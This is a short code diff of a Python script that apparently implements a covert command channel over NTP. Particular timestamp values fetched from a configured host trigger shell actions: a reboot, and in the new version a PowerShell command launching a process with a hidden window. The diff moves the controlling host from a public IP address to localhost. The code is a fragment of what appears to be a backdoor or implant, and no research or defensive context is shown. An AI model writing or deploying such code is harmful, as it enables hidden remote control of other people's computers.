@@ -2,7 +2,7 @@ import ntplib
 import sys, os, subprocess
 from time import ctime
 
-HostIP = '162.243.187.227' #'127.0.0.1'
+HostIP = '127.0.0.1' #'162.243.187.227'
 
 # Essential shell functionality
 def run_command(cmd):
@@ -24,4 +24,7 @@ if int(command) == int(-2208988798):
   run_command("reboot")
 # Test command  
 if int(command) == int(-2208988797):
-  print run_command("calc.exe") #print run_command("echo test")
+  print run_command('powershell Start-Process $env:windir\\system32\\notepad.exe -WindowStyle Hidden')
+  #print run_command("calc.exe")
+  #print run_command("echo test")
+
